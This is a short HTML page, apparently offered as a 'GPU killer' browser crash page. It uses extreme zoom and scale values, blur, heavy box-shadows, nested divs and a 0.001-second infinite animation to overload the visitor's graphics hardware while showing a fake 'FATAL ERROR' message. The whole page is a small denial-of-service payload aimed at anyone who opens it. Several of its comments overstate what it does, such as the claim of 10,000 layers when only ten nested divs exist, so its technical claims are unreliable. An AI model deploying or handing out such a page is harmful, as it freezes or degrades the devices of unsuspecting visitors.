<!DOCTYPE html>
<html>
<head>
    <title>CRITICAL_SYSTEM_OVERLOAD</title>
    <style>
        /* THE GPU KILLER: Insane Zoom + Massive Overdraw */
        html, body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            /* The 'TikTok' Trick: Scale coordinates beyond hardware limits */
            zoom: 99999999%; 
            transform: scale(9999999);
            filter: blur(1px); /* Forces the GPU to post-process 10,000 layers */
        }

        div {
            /* Forced Flexbox: Makes the CPU calculate layout for every layer */
            display: flex;
            width: 100%;
            height: 100%;
            border: 0.00001px solid lime; /* Sub-pixel rendering stress */
            box-shadow: 0 0 100px red;    /* Massive GPU overdraw per layer */
            animation: infinite_shake 0.001s infinite;
        }

        @keyframes infinite_shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            50% { transform: translate(-1px, -2px) rotate(1deg); }
            100% { transform: translate(1px, 1px) rotate(0deg); }
        }
    </style>
</head>
<body>
    <div><div><div><div><div><div><div><div><div><div>
    <h1>FATAL ERROR</h1>
    </div></div></div></div></div></div></div></div></div></div>
</body>
</html>
